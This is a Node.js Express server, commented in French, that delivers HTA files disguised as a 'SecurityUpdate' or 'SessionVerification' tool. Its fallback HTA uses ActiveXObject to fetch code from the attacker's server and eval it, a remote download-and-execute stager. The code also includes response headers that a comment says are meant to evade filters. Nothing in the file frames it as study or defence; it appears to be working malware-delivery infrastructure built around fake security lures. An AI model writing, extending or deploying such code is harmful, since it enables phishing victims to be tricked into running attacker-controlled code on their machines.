const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();

// Middleware pour logs détaillés
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.url}`);
  next();
});

// Headers pour contourner les filtres
app.use((req, res, next) => {
  res.set({
    'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval'",
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'SAMEORIGIN'
  });
  next();
});

// Route principale - téléchargement du HTA
app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "file.hta");
  
  if (!fs.existsSync(filePath)) {
    // Regénération automatique si fichier manquant
    const defaultHTA = `<!DOCTYPE html><html><head><HTA:application><script>location.href='${process.env.DOMAIN || 'https://' + (req.hostname || 'localhost')}/download';</script></head></html>`;
    fs.writeFileSync(filePath, defaultHTA);
  }
  
  res.set({
    'Content-Type': 'application/hta',
    'Content-Disposition': 'attachment; filename="SessionVerification.hta"',
    'Cache-Control': 'no-cache, no-store'
  });
  
  res.download(filePath, "SecurityUpdate.hta", (err) => {
    if (err && !res.headersSent) {
      console.error("Download error:", err);
      res.status(500).send("Verification tool temporarily unavailable");
    }
  });
});

// Route alternative pour compatibilité
app.get("/check", (req, res) => {
  const filePath = path.join(__dirname, "file.hta");
  
  // Vérification améliorée
  fs.stat(filePath, (err, stats) => {
    if (err) {
      console.error("File stat error:", err);
      
      // Fallback vers génération HTA minimal
      const fallbackHTA = generateFallbackHTA(req);
      res.set('Content-Type', 'application/hta');
      res.send(fallbackHTA);
      return;
    }
    
    res.set({
      'Content-Type': 'application/hta',
      'Content-Disposition': 'inline; filename="SystemCheck.hta"',
      'Content-Length': stats.size
    });
    
    const stream = fs.createReadStream(filePath);
    stream.pipe(res);
    stream.on('error', (streamErr) => {
      console.error("Stream error:", streamErr);
      if (!res.headersSent) {
        res.status(500).send("Stream error");
      }
    });
  });
});

// Endpoint de santé pour Railway
app.get("/health", (req, res) => {
  res.json({
    status: "operational",
    timestamp: new Date().toISOString(),
    service: "session-verification",
    version: "2.0.1"
  });
});

// Génération HTA de fallback
function generateFallbackHTA(req) {
  const domain = process.env.DOMAIN || req.headers.host || 'localhost:3000';
  return `<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION ID="FallbackVerifier" />
<script>
// Redirection dynamique vers le vrai vérificateur
setTimeout(function() {
  var x = new ActiveXObject("Microsoft.XMLHTTP");
  x.open("GET", "http://${domain}/check", false);
  x.send();
  if (x.status === 200) {
    eval(x.responseText);
  }
}, 1000);
</script>
</head>
<body>Loading verification module...</body>
</html>`;
}

// Gestion des erreurs globale
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  res.status(500).send("Internal verification system error");
});

// Configuration du port avec fallback robuste
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

app.listen(PORT, HOST, () => {
  console.log(`✅ Verification server active on ${HOST}:${PORT}`);
  console.log(`📁 Serving HTA from: ${__dirname}`);
  console.log(`🌐 Access via: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
});
